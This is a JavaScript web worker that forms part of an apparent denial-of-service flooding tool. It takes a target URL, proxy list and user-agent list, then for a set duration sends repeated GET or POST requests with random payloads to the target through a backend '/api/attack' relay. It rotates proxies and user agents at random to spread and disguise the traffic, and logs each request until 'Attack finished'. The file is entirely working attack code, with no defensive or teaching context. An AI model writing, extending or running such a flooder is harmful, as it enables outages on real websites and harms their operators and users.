self.onmessage = async (e) => {
  const { target, proxies, userAgents, duration, packetDelay, packetSize } =
    e.data;

  const fixedTarget = target.startsWith("http") ? target : `https://${target}`;
  let totalPackets = 0;
  const startTime = Date.now();

  const sendRequest = async (proxy, userAgent) => {
    try {
      const isGet = packetSize > 64 ? false : Math.random() < 0.5;
      const payload = randomString(packetSize);

      const response = await fetch("/api/attack", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          target: fixedTarget,
          proxy,
          userAgent,
          method: isGet ? "GET" : "POST",
          payload: isGet ? undefined : payload,
        }),
      });

      const result = await response.json();

      if (result.success) {
        totalPackets++;
        self.postMessage({
          log: `✅ Request successful from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`,
          totalPackets,
        });
      } else {
        throw new Error(result.error);
      }
    } catch (error) {
      self.postMessage({
        log: `❌ Request failed from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}: ${error.message}`,
        totalPackets,
      });
    }
  };

  const interval = setInterval(() => {
    const elapsedTime = (Date.now() - startTime) / 1000;

    if (elapsedTime >= duration) {
      clearInterval(interval);
      self.postMessage({ log: "Attack finished", totalPackets });
      self.close();
      return;
    }

    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    sendRequest(proxy, userAgent);
  }, packetDelay);
};

function randomString(length) {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}
